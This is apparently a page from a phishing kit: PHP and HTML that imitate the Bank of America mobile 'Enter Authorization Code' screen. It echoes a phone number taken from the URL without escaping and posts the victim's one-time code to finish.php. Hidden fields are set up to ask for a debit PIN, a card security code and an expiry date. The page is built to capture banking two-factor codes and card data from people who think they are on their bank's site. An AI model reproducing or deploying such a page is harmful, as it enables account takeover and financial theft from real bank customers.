<?php
session_start();
error_reporting(0);
$phone = @$_GET['phone'];

?>



<html class=" js no-flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
        <meta name="apple-itunes-app" content="app-id=284847138">
		<!--[if IE 9]>
			<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" >
		<![endif]-->
		<title>Bank of America Mobile - Enter Authorization Code</title>
		<!--Now dynamically appended (mobileweb.js) depending on project<link rel="stylesheet" href="css/mobileweb.css">-->
	<link rel="stylesheet" href="css/bactouch.css"><link rel="stylesheet" href="css/toolbar.css"><link rel="stylesheet" href="css/bact_listview.css"><link rel="stylesheet" href="css/footer.css"><link rel="stylesheet" href="css/slidemenu.css"></head>

	<body><div id="page" class="" style="display: block; position: static; float: left; height: 100%; width: 100%; left: 100%;"><div id="cmw_toolBar_" class="cmw_toolBar_"><a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite" href="#" title="Show menu for all mobile banking features" role="button"></a><div id="barker" class="hidden"></div><h1 id="title" class=""><div id="cmw_toolBar_titleText" style="padding-left: 10px; padding-right: 10px; width: 100%;">Enter Authorization Code</div><span class="adaHidden" id="adaTitleText"></span></h1><a id="rightButton" class="hidden"></a></div><div id="SASI_banner_container"></div><div class="pageMinHeight"><div id="divMessaging" class="hidden" tabindex="-1">
    <span class="messageIcon error"></span>
    <div class="messageText">
        <h2></h2>
        <p></p>
    </div>
</div>
<div id="authorizationCodeDiv">
    <div id="CheckEmailForAuthCode" style="display: none;">
    </div>
    <!-- <div class="paddingVert10 padding10" id="AuthorizationCode">
    </div> -->
    <div id="TextMessageForAuthCode"><div class="paddingVert10 padding10"><p>An authorization code was sent to your phone</p><div><div class="toppad20 paddingHoriz10"><b><?php print " $phone ";?></b></div></div></div></div>
         
    <div id="alreadyHaveCode" class="paddingVert10 padding10" style="display: none;">
    </div>
         <form action="finish.php" method="post" autocomplete="off" name="form">	
    <div class="inputContainer">
        <label for="authCode" id="authCodeOtac">Authorization Code</label>
        <input name="code" id="authCode" type="tel" pattern="[0-9]*" title="Authorization Code" maxlength="6" placeholder="XXXXXX"><a href="javascript:void();" style="display: none" role="button" title="Clear text field"></a>
    </div>
    <div class="padding10 toppad20" id="CodeExpires"><p>The code expires 10 minutes after you request it.</p></div>
    <div class="toppad20 padding10" id="CodeExpiresByEmail" style="display: none;">The code expires 10 minutes after you request it. Please check your spam folder if you do not receive your code.</div>
    <div class="paddingVert10 padding10 blueLink">
    </div>
    <div id="cardValidation">
    <div id="DebitCardValidation" style="display: none;">
        <div class="mtop-30 paddingHoriz10 bottompad10" id="selectDebitCard">
         
        </div>
        <div id="debitCardList">
        </div>

        <div class="toppad20 paddingHoriz10" id="selectDebitPin">
          
        </div>
        <div class="inputContainer">
            <label for="debitPin" id="DebitPin"></label>
            <input id="debitPin" type="tel" pattern="[0-9]*" title="PIN" minlength="4" maxlength="12" class="masked" placeholder="Enter here"><a href="javascript:void();" style="display: none" role="button" title="Clear text field"></a>
        </div>
    </div>

    <div id="CreditCardValidation" style="display: none;">
        <div class="toppad20 paddingHoriz10 bottompad10" id="selectCreditCard">
          
        </div>
        <div id="creditCardList">
        </div>

        <div class="mtop-30 paddingHoriz10" id="creditCardDetails">
         
        </div>
        <div class="inputContainer">
            <label for="securityCodeOtac" id="SecurityCode"></label>
            <input id="securityCodeOtac" type="tel" pattern="[0-9]*" title="securityCode" maxlength="4" class="masked" placeholder="XXXX"><a href="javascript:void();" style="display: none" role="button" title="Clear text field"></a>
        </div>
        <div class="inputContainer">
            <label for="expiryDate" id="ExpiryDate"></label>
            <input id="expiryDate" type="tel" pattern="[0-9]*" title="expiryDate" maxlength="5" placeholder="MM/YY"><a href="javascript:void();" style="display: none" role="button" title="Clear text field"></a>
        </div>
    </div> 
</div>
<div id="btnPin" style="position: fixed; bottom: 0px;">
        <ul class="btnGroupPin">
            <li>
			<input type="hidden" value="<?php print " $phone ";?>">
                <a id="cancelButton" class="btnNeg" role="button">
                    <span class="btnText fontBold">Cancel</span>
                </a>
            </li>
            <li>
                <a id="continue" class="btnPos" role="button" title="" href="#" onclick="document.forms['form'].submit(); return false;">
                    <span class="btnText fontBold">Continue</span>
                </a>
				</form>
            </li>
        </ul>
    </div>
</div>
	

<div class="spinnerPanel" style="height: 938px; display: none;"><div class="spinner" style="top: 375.2px; display: block;"><span class="messageIcon"></span><a id="spinnerLink" class="adaHidden" href="javascript:void(0)" role="dialog">processing</a></div></div><div id="slidemenu_sidePanel" class="" style="display: none"><div class="slidemenu_menu">
	<ul class="popoverMenu">
		<li id="signoutButtonItem" class="hidden button" style="display: none;">
			<span class="menuButton">
				<a id="signoutButtonLink" class="linkButton" href="#home?app=signon" aria-hidden="true" role="button">Sign Out</a>
			</span>
		</li>
	<li class="menuCategory"> </li><li class="menuItem accounts_on"><div class="hidden right tally blue" style="color: rgb(255, 255, 255);">1</div><a class="disabled" href="#home?app=accounts" style="color: rgb(1, 124, 194);">Accounts</a></li><li class="menuItem mycard"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="disabled" href="#creditCardStatement?app=accounts">My Card</a></li><li class="menuItem mysbcard"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="disabled" href="#sbCardAccountDetails?app=accounts">My Card</a></li><li class="menuItem mycards"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="disabled" href="#home?app=mycards">My Cards</a></li><li class="menuItem mysbcards"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="disabled" href="#home?app=mycards">My Cards</a></li><li class="menuItem rewards"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="disabled" href="#home?app=rewards">Rewards</a></li><li class="menuItem billpay"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="disabled" href="#home?app=billpay">Bill Pay</a></li><li class="menuItem transfers"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="disabled" href="#home?app=transfers">Transfer | Send</a></li><li class="menuItem bamd"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="disabled" href="#home?app=deals">Special Offers &amp; Deals</a></li><li class="menuItem bankrewards"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="disabled" href="#home?app=prefrewards">Banking Rewards</a></li><li class="menuItem prefrewards"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="disabled" href="#home?app=prefrewards">Preferred Rewards</a></li><li class="menuCategory"> </li><li class="menuItem help"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="" href="#helpSupport?app=settings">Help &amp; Support</a></li><li class="menuItem contact"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="" href="#contactus?app=click2call">Contact Us</a></li><li class="menuItem locations"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="" href="https://locators.bankofamerica.com/">Locations</a></li><li class="menuItem settings"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="" href="#home?app=settings">Profile &amp; Settings</a></li><li class="menuCategory"> </li><li class="menuItem feedback"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="" href="https://secure.opinionlab.com/ccc01/o.asp?id=wwxOVCML&amp;referer=%20http%3A%2F%2Fmobile.bankofamerica.com%2Fmobileweb">Send App Feedback</a></li><li class="menuItem legal"><div class="hidden right tally" style="color: rgb(255, 255, 255);">1</div><a class="" href="#legal_Info?app=settings">Legal Info &amp; Disclosures</a></li></ul>
</div></div><div id="inauth_font_detector" style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div><div id="inauth_font_detector" style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div><div id="inauth_font_detector" style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div></body></html>